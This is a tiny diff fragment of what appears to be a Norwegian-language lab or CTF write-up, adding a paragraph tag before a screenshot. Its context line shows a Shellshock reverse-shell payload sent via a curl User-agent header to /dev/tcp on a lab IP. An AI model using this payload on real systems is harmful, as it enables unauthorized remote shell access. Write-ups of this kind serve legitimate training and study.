@@ -52,4 +52,5 @@ curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.56/1234 0>&1
 ```
 
 Og vi har shell!
+<p>
 <img src="shell.png">
